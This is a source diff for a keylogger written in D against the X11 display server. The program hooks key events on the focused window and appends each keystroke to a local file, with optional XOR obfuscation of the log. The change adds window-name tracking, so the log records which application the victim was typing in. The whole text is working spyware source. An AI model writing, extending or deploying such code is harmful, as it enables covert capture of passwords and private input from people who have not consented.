@@ -9,12 +9,19 @@ import std.array;
 
 // The file our keylog will be written to
 enum saveFile = "test.txt";
+
 // Our xor key. 
 // As the keys we're logging are only 1 byte, only a 1 byte key is needed
 enum xorKey = "A";
 
-// This line compiles in the xor code
-version = USEXOR;
+// If uncommented this line compiles in the xor code
+// version = USEXOR;
+
+// The name of the current window
+string currentWindowName;
+
+// The name of the last window the user typed in
+string lastWindowName;
 
 void main() {
 	XSetErrorHandler(&foo);
@@ -26,13 +33,14 @@ void main() {
     XComposeStatus comp;
     int len;
     int revert;
-	string currentWindowName;
 	XGetInputFocus(d, &curFocus, &revert);
     XSelectInput(d, curFocus, KeyPressMask|KeyReleaseMask|FocusChangeMask);
+	currentWindowName = getFocusedWindowName(d, curFocus);
 	while (true) {
         XEvent ev;
         XNextEvent(d, &ev);
         switch (ev.type) {
+			case FocusOut:
                 if (curFocus != root) {
                     XSelectInput(d, curFocus, 0);
 				}
@@ -74,6 +82,13 @@ void main() {
 void logKey(string key) {
 	version(USEXOR) {
 		key = xor(key, xorKey);
+	}
+	// lastWindowName is the name of the last window that the user typed in
+	// if it has changed than the user has focused a new window and we should
+	// update the log
+	if (lastWindowName != currentWindowName) {
+		lastWindowName = currentWindowName;
+		std.file.append(saveFile, cast(void[])("\n" ~ currentWindowName ~ "\n"));
 	}
 	// Add a space to each key so we can tell if a user
 	// pressed a key or typed 
